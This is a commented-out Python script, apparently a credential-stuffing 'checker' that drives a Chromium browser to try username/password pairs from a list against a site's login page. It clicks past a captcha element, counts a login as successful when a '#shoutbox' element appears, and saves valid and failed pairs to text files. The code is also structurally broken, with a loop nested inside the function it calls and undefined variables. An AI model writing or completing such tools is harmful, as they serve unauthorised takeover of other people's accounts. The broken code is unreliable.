# from asyncio import wait_for
#
# from DrissionPage import ChromiumPage, ChromiumOptions
#
# import time
# import random
#
# from checkers.util.main.util import r_0_2_0_3, r_0_3_0_4, r_1_1_1
# from checkers.util.nursultan.util import url
#
#
# def check_login(page, username, password):
#  page.get(url=url)
#  time.sleep(r_0_3_0_4)
#
#  if page.ele('@class=cb-i'):
#   captcha_button = page.ele('@class=cb-i')
#   captcha_button.click()
#   page.ele('@type=text').input(username)
#   page.ele('@type=password').input(password)
#   page.ele('@type=button').click()
#   time.sleep(r_0_2_0_3)
#
#  else:
#   time.sleep(r_1_1_1)
#
#   for username, password in credentials_list:
#    try:
#     if check_login(page, username, password) and page.ele('#shoutbox'):
#      saved_credentials.append((username, password))
#      print(f"Successful login: {username}:{password}")
#     else:
#      bad_credentials.append((username, password))
#      # print(f"Failed entry: {username}")
#
#     page.set.cookies.clear()
#
#    except Exception as e:
#     bad_credentials.append((username, password))
#     print(f"Error: {username}: {e}")
#
#   with open('../valid_future.txt', 'w', encoding='utf-8') as f:
#    for cred in saved_credentials:
#     f.write(f"{cred[0]}:{cred[1]}\n")
#
#   with open('../txt/bad_credentials.txt', 'w', encoding='utf-8') as f:
#    for cred in bad_credentials:
#     f.write(f"{cred[0]}:{cred[1]}\n")
#
#   page.close()
